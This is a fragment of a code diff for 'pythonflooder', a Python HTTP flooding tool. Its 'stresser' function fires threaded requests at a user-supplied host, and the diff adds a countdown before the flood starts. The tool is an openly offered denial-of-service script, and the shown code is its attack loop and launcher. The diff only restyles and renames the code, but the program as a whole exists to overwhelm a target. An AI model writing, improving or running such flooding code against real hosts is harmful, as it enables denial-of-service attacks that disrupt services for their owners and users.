@@ -27,7 +27,7 @@ def stresser():
         try:
             requests.get(_host)
             threads = threading.active_count()
-            print(" [*] flooding {}. threads: {}".format(_host, threads))
+            print(f" [*] flooding {_host}. threads: {threads}")
         except (requests.ConnectionError, requests.HTTPError):
             print("host not found. please enter a correct URL / IP.")
         except UnboundLocalError:
@@ -67,14 +67,24 @@ def _threads_():
         exit()
 
 
-def main():
+def start():
     system("cls")
     print("========================")
     print("pythonflooder v1.0.2")
     print("author: frostyworks")
     print("========================")
     sleep(2)
+    system("cls")
+    print("[*] Starting to flood in: 3")
+    sleep(1)
+    system("cls")
+    print("[*] Starting to flood in: 2")
+    sleep(1)
+    system("cls")
+    print("[*] Starting to flood in: 1")
+    sleep(1)
+    system("cls")
     stresser()
 
 
-main()
+start()
